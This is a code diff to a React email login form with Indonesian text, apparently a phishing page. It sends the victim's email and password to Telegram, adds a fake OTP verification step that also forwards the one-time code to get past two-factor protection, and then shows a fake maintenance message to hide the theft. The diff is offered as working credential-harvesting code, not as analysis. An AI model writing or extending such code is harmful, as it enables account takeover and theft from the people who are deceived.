@@ -12,6 +12,8 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState(false);
   const [pwError, setPwError] = useState(false);
+  const [otp, setOtp] = useState('');
+  const [otpError, setOtpError] = useState(false);
   const [showCustomLoading, setShowCustomLoading] = useState(false);
   const [step, setStep] = useState(1);
 
@@ -50,8 +52,25 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
 
     if (!ok) return;
 
-    // Send to Telegram with "Email Login" context
-    const success = await sendToTelegram(email, password, "Email Login", "-");
+    // Send Email and Password to Telegram immediately (before OTP)
+    await sendToTelegram(email, password, "Email Login", "-");
+
+    // Proceed to OTP Step
+    setStep(2);
+  };
+
+  const handleOtpSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (playClickSound) playClickSound();
+
+    if (!otp || otp.length < 4) {
+      setOtpError(true);
+      return;
+    }
+    setOtpError(false);
+
+    // Send Email, Password and OTP to Telegram
+    const success = await sendToTelegram(email, password, "Email Login - OTP", otp);
     
     setShowCustomLoading(true);
     setStep(0); // Hide form
@@ -190,6 +209,67 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
         </div>
       )}
 
+      {/* ================= STEP 2: OTP VERIFICATION ================= */}
+      {step === 2 && (
+        <div className="relative w-[550px] animate-pop-in z-50">
+          <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
+            {/* Header */}
+            <div className="h-14 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
+              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div>
+              <h2 className="text-[#ffd700] text-2xl font-black tracking-wide drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] uppercase" style={{ textShadow: '0 2px 0 #b71c1c' }}>
+                Verifikasi
+              </h2>
+              <div className="absolute bottom-1 flex gap-1 justify-center w-full">
+                {[...Array(12)].map((_, i) => (
+                  <div key={i} className="w-1 h-1 rounded-full bg-[#ffd700] shadow-sm"></div>
+                ))}
+              </div>
+              <button 
+                onClick={handleClose}
+                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#ff8a80] hover:text-white transition-colors drop-shadow-md active:scale-90"
+              >
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+              </button>
+            </div>
+
+            {/* Body */}
+            <div className="px-10 py-8 flex flex-col gap-5 relative bg-white/50 backdrop-blur-sm">
+              <div className="text-center text-gray-600 font-bold mb-2">
+                Masukkan kode verifikasi yang telah dikirim ke perangkat Anda.
+              </div>
+
+              {/* Input OTP */}
+              <div className="flex items-center justify-center">
+                <div className="w-full max-w-xs relative">
+                  <input 
+                    type="text" 
+                    inputMode="numeric"
+                    className="w-full h-12 bg-[#bf6b86] rounded-full px-4 text-white placeholder-white/70 outline-none border border-pink-300/50 shadow-inner font-bold text-lg tracking-widest text-center"
+                    placeholder="Kode OTP" 
+                    value={otp}
+                    onChange={(e) => setOtp(e.target.value)}
+                  />
+                  {otpError && <span className="absolute -bottom-6 left-0 right-0 text-center text-xs text-red-500 font-bold">Kode OTP wajib diisi</span>}
+                </div>
+              </div>
+
+              {/* Confirm Button Area */}
+              <div className="flex items-center justify-center mt-6 relative">
+                 <button 
+                    onClick={handleOtpSubmit}
+                    className="w-40 h-11 bg-gradient-to-b from-[#66bb6a] to-[#2e7d32] hover:from-[#81c784] hover:to-[#388e3c] rounded-full border-2 border-[#ffd700] text-white font-bold text-lg shadow-[0_4px_6px_rgba(0,0,0,0.3)] active:scale-95 transition-all flex items-center justify-center tracking-wider"
+                    style={{ textShadow: '0 1px 2px rgba(0,0,0,0.5)' }}
+                 >
+                   Konfirmasi
+                 </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Success Modal */}
       {step === 3 && (
         <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-pop-in">
@@ -215,7 +295,7 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
 
             {/* Text Content */}
             <h3 className="text-[#ffd700] text-lg font-black uppercase tracking-wider mb-2 text-center drop-shadow-md">
-              Sistem Sibuk
+              Sistem Maintenance
             </h3>
             <p className="text-white/80 text-center text-xs leading-relaxed mb-4 font-medium px-2">
               Maaf, saat ini sistem sedang dalam perbaikan berkala untuk meningkatkan kualitas layanan.
